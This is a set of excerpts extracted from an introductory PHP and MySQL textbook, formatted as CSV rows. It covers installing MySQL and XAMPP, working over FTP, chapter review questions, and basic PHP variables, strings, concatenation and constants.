Larger Text,Smaller Text,Symbol
Installing MySQL 5.0,"The final component you need to develop and test pages on your local computer is 
 MySQL. Now you’ll download the MySQL Installer:
  
 1. Download the MySQL binaries. Both the binaries and the source code can be 
 found at
  http://dev.mysql.com/downloads/
 . Under MySQL Community Server, 
 click the Download button.
  
 2. Click Windows.
  
 3. Click the download link for Windows Essentials (x86). This file is a Windows 
 MSI installer.
  
 4. The link takes you to a page where you can either enter your personal info or 
 just click No Thanks to download the file. A number of download locations are 
 available; select one. Download the recommended latest version, currently 5.0. 
 Save the installer file to your desktop.
  
 5. Double-click the MSI installer file on your desktop. A setup wizard, shown in 
 Figure 2-17, walks you through the installation process. Click Next.
  
 Developing Locally
  
 |
  
 27",NA
XAMPP,"XAMPP is available for Windows, Linux, and newer Mac OS X systems (Intel-based, 
 OS X 10.4). XAMPP offers a simple, integrated approach to installing all the tools 
 you need on multiple platforms. The following steps cover installing XAMPP on 
 Windows, but the installation process is similar for all platforms:
  
 Developing Locally
  
 |
  
 33",NA
Working Remotely,"Although we recommend that you start out working locally, you can use an ISP 
 account as long as it supports PHP and MySQL.
  
 You need login information to the remote server, and you may need to use your 
 ISP’s web-based tool to create your database.
  
 To transfer your files and directories, you need to activate a File Transfer Protocol 
 (FTP) account at your ISP, usually through your account control panel. Once you 
 have an FTP login, upload your HTML and PHP files using an FTP client.
  
 Working Remotely
  
 |
  
 35",NA
Chapter 2 Questions,"Question 2-1 
  
  
 What three components must be installed to create a dynamic web site?
  
 Question 2-2 
  
  
 What OS has Apache installed already?
  
 Question 2-3 
  
  
 Where should you create a PHP directory for 
 downloads?
  
 Question 2-4 
  
  
 What does the hash (
 #
 ) sign mean?
  
 Question 2-5 
  
  
 How do you work remotely?
  
 Question 2-6 
  
  
 How do you transfer files to your ISP?
  
 Question 2-7 
  
  
 How must PHP files be accessed?
  
 See the “Chapter 2” section in the Appendix for the answers to these questions.
  
 38
  
 |
  
 Chapter 2: Installation",NA
CHAPTER 3,NA,NA
Exploring PHP,"3
  
 With PHP, MySQL, and Apache installed, you’re ready to begin writing code. Unlike 
 many languages, PHP doesn’t require complex tools such as compilers and debug-
 gers. In fact, you’ll soon see that you can enter PHP directly into your existing 
 HTML documents, and with just a few tweaks, you’ll be off and running.
  
 In this chapter, we’ll start by showing you how PHP handles simple text, and then 
 move on to basic decision-making. Some really cool things you can do include 
 show-ing an image based on the current user’s browser, and printing a warning 
 message if the user is browsing from an operating system that makes your web site 
 look crummy. All this and more is possible with PHP, which makes these tricks 
 simple.",NA
PHP and HTML Text,"It’s simple to output text using PHP; in fact, handling text is one of PHP’s special-
 ties. We’ll begin with detailing where PHP is processed, then look at some of the 
 basic functions to output text, and from there go right into printing text based on a 
 certain condition being true.",NA
Text Output,"You’ll want to be able to display text easily and often. PHP lets you do that, though 
 you’ll need to use proper PHP syntax when creating the code. Otherwise, your 
 browser assumes that everything is HTML and outputs the PHP code directly to the 
 browser. Everything looks like text and code mixed up. This will certainly confuse 
 your users! You can use whichever text editor you like to write your PHP code, 
 including Notepad or DevPHP (
 http://sourceforge.net/projects/devphp/
 ).
  
 Our examples demonstrate how similar HTML markup and PHP code look, and what 
 you can do to start noticing the differences between them.
  
 39",NA
Coding Building Blocks,"To write programs in PHP that do something useful, you’ll need to understand 
 blocks of reusable code called functions or methods, as well as how to temporarily 
 store information that cannot be executed in variables. We talk about
  evaluations
 , 
 which allow your code to make intelligent decisions based on mathematical princi-
 ples and user input.",NA
Variables,"Since we assume that some of you haven’t done any programming, we understand 
 that variables may be a new concept. A
  variable
  stores a value, such as the text 
 string“Hello World!” or the integer value
  1
 . A variable can then be reused 
 throughout your code, instead of having to type out the actual value over and over 
 again for the entire life of the variable, which can be frustrating and tedious. Figure 
 3-2 shows a newly created variable that has been assigned a value of
  30
 .
  
  
 PHP page 
  
 <?PHP
  
  $age = 30;
  
  
 Memo
 ry 
  
 $age
  
 30
  
 ?> 
  
  
 Named 
 storage
  
 Figure 3-2. A PHP variable holds a value in memory
  
 In PHP, you define a variable with the following form:
  
 $variable_name = value;
  
 Pay very close attention to some key elements in the form of variables. The dollar 
 sign (
 $
 ) must always fill the first space of your variable. The first character after the 
 dollar sign must be either a letter or an underscore. It can’t under any 
 circumstances be a number; otherwise, your code won’t execute, so watch those 
 typos!
  
 Coding Building Blocks
  
 |
  
 43",NA
Strings,"Variables can hold more than just numbers. They can hold characters and
  strings
 , 
 which are particular sequences of individual characters (see Figure 3-6).
  
 String
  
  
 = testing
  
 t
  
 e
  
 s
  
 t
  
 i
  
 n
  
 g
  
 Characters
  
 Figure 3-6. How individual characters form a string
  
 A string can be used directly in a function call or stored in a variable. In Example 3-
 11, we create the exact same string twice: first we store it in a variable, and then we 
 place the string directly into a function.
  
 Example 3-11. Working with strings
  
 <?php 
  
 $my_string = ""Margaritaville - Suntan Oil Application!""; 
  
 echo ""Margaritaville - Suntan Oil Application!""; 
  
 ?>
  
 In Example 3-12, the first string is stored in the variable
  $my_string
 , while the sec-
 ond string is used in the
  echo
  function and
  isn’t
  stored. Remember to save your 
 favor-ite strings into variables if you plan on using them more than once!
  
 Strings are flexible. You can even insert variables such as
  $my_string
  into string defi-
 nitions, provided that you use double quotes to start and end your string. On the 
 other hand, using single quotes to start and end your string does not allow a 
 variable to be placed in the string.
  
 50
  
 |
  
 Chapter 3: Exploring PHP",NA
Concatenation,"Concatenation combines one or more text strings and variables, as shown in 
 Example 3-18. When performing this combination, you save yourself the hassle of 
 creating numerous
  echo
  statements; in other words, you build up a string and use it.
  
 Example 3-18. Concatenating strings together
  
 <?php 
  
 $my_string = ""Hello Max. My name is: ""; 
  
 $newline = ""<br />""; 
  
 echo $my_string . ""Paula"" . $newline; 
  
 echo ""Hi, I'm Max. Who are you? "" . $my_string . $newline; 
  
 echo ""Hi, I'm Max. Who are you? "" . $my_string . ""Paula""; 
  
 //The last line is the same as echo ""Hi, I'm Max. Who are you? $my_string Paula""; ?>
  
 The output of your code looks like Figure 3-7 in your browser window.
  
  
 Figure 3-7. Concatenation output
  
 Variables and text strings are joined together with a period (
 .
 ). This can be done 
 multiple times, as shown in Figure 3-8.
  
 String1 . String2 . String3
  
 String1 String2 String3
  
 Figure 3-8. How strings come together with concatenation
  
 54
  
 |
  
 Chapter 3: Exploring PHP",NA
Constants,"You can define constants in your program. A constant, like its name implies, cannot 
 change its value during the execution of your program. It’s defined using the
  define( 
 ) 
 function, which takes the name of the constant as the first parameter and the 
 values as the second parameter. The definition of a constant is global and can be 
 defined as any simple (scalar) data type, such as a string or number. You can get the 
 value of a constant by simply specifying its name, as shown in Example 3-20, or by 
 using the 
 constant
  function. Unlike how you handle variables, you should
  not
  put the 
 dollar sign (
 $
 ) before a constant.
  
 If the name of a constant is stored in a variable or the result of a function, you’ll 
 need to use the function
  constant(
 name
 )
  to return the constant’s value. It takes a 
 parame-ter as the name of the constant and returns its value. Or you could use
  
 get_defined_ constants( )
  to return a list (as an array) of all your defined constants. If 
 you’re unsure about the arguments to a function, you can search using the PHP site 
 (
 http:// www.php.net
 ) to find function parameters and return values.
  
 These are the differences between constants and variables:
  
 • It’s common practice to capitalize a variable name for constants.
  
 • Constants do not have a dollar sign (
 $
 ) at the start of their names.
  
 • Constants can be defined only by using the
  define
  function, not by simple 
  
 assignment.
  
 • Constants are defined and accessed globally.
  
 • Constants cannot be redefined or undefined once they have been set.
  
 • Constants can evaluate only to scalar values.
  
 Coding Building Blocks
  
 |
  
 55",NA
